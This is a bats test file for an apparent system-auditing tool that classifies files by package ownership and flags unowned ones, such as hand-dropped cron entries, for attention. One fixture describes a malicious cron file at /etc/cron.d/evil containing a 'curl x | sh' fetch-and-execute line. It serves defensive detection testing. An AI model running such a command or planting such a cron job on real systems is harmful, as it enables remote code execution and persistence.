#!/usr/bin/env bats
load ../helpers

setup() { src; reset_state; }

@test "pkg_owns returns 2 (undeterminable) when no package manager" {
  _PM=none
  run pkg_owns "$REVELIO"
  [ "$status" -eq 2 ]
}

@test "pkg_owns returns 2 for a non-existent path" {
  _PM=rpm
  run pkg_owns /no/such/path/xyz123
  [ "$status" -eq 2 ]
}

@test "classify_provenance: owned -> normal tier" {
  _PM=rpm
  pkg_owns() { return 0; }   # override: pretend owned
  classify_provenance /usr/lib/systemd/system/chrony.service ssh "chrony unit" "ExecStart=..." ""
  emitted normal "chrony unit"
}

@test "classify_provenance: not owned -> attention tier" {
  _PM=rpm
  pkg_owns() { return 1; }   # override: pretend not owned
  classify_provenance /etc/cron.d/evil sched "hand-dropped cron" "curl x | sh" "rm /etc/cron.d/evil"
  emitted attention "hand-dropped cron"
}

@test "classify_provenance: undeterminable -> attention + provenance note" {
  _PM=none
  classify_provenance /etc/cron.d/x sched "unknown-provenance cron" "..." ""
  emitted attention "provenance undeterminable"
}
